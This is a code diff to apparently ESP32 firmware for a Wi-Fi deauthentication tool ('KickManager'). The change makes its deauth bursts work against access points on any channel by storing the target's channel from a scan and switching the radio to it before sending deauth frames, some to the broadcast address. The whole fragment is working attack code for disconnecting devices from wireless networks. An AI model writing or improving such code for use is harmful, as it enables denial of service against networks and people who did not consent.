@@ -15,8 +15,9 @@ static const uint8_t DEAUTH_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 #define DEAUTH_DELAY_BETWEEN_PACKETS_MS 50
 
 KickManager::KickManager()
-    : targetSet_(false), targetIsOwnAP_(false), attacking_(false),
-      lastBurstMs_(0), packetCount_(0), targetEncryption_(WIFI_AUTH_OPEN) {
+    : targetChannel_(1), targetSet_(false), targetIsOwnAP_(false),
+      attacking_(false), lastBurstMs_(0), packetCount_(0),
+      targetEncryption_(WIFI_AUTH_OPEN) {
   memset(targetBSSID_, 0, 6);
   targetSSID_[0] = '\0';
   memset(deauthBuf_, 0, sizeof(deauthBuf_));
@@ -38,6 +39,9 @@ void KickManager::setTargetFromScan(int scanIndex) {
   if (!bssid)
     return;
   memcpy(targetBSSID_, bssid, 6);
+  targetChannel_ = (uint8_t)WiFi.channel(scanIndex);
+  if (targetChannel_ < 1 || targetChannel_ > 14)
+    targetChannel_ = 1;
   String ssidStr = WiFi.SSID(scanIndex);
   if (ssidStr.length() > 0) {
     size_t len = ssidStr.length();
@@ -78,10 +82,15 @@ void KickManager::stopAttack() {
 }
 
 void KickManager::sendDeauthBurst() {
-  // Проверка состояния WiFi перед отправкой
   if (WiFi.getMode() == WIFI_OFF) {
     Serial.println("[KICK] WiFi is OFF, cannot send deauth packets");
     return;
+  }
+
+  esp_err_t chErr = esp_wifi_set_channel(targetChannel_, WIFI_SECOND_CHAN_NONE);
+  if (chErr != ESP_OK) {
+    Serial.printf("[KICK] set_channel(%d) error: %d\n", (int)targetChannel_,
+                  (int)chErr);
   }
 
   // 26-byte deauth: FC(2), Duration(2), DA(6), SA(6), BSSID(6), Seq(2),
